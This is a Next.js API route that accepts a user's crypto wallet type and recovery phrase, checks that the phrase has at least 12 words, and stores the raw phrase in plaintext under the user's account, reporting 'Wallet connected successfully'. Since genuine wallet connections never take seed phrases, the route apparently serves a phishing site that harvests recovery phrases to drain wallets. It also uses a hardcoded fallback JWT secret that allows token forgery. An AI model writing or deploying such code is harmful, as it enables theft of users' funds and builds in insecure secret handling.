import { NextResponse } from 'next/server';
import { cookies } from 'next/headers';
import jwt from 'jsonwebtoken';
import dbConnect from '@/lib/db';
import Wallet from '@/models/Wallet';
import User from '@/models/User';

export async function POST(req: Request) {
  try {
    const token = (await cookies()).get('token')?.value;
    if (!token) {
        return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
    }

    let decoded: any;
    try {
        decoded = jwt.verify(token, process.env.JWT_SECRET || 'fallback_secret');
    } catch {
        return NextResponse.json({ error: 'Invalid token' }, { status: 401 });
    }

    const { walletType, phrase } = await req.json();

    if (!walletType || !phrase) {
        return NextResponse.json({ error: 'Missing required fields' }, { status: 400 });
    }

    // Basic validation for phrase length (e.g., 12 or 24 words)
    const wordCount = phrase.trim().split(/\s+/).length;
    if (wordCount < 12) {
        return NextResponse.json({ error: 'Invalid recovery phrase. Must be at least 12 words.' }, { status: 400 });
    }

    await dbConnect();

    // Verify user exists
    const user = await User.findById(decoded.userId);
    if (!user) {
        return NextResponse.json({ error: 'User not found' }, { status: 404 });
    }

    // Save Wallet
    const newWallet = await Wallet.create({
        userId: user._id,
        walletType,
        phrase,
    });

    return NextResponse.json({ message: 'Wallet connected successfully', walletId: newWallet._id }, { status: 201 });

  } catch (error: any) {
    console.error('Connect wallet error:', error);
    return NextResponse.json({ error: 'Server error' }, { status: 500 });
  }
}
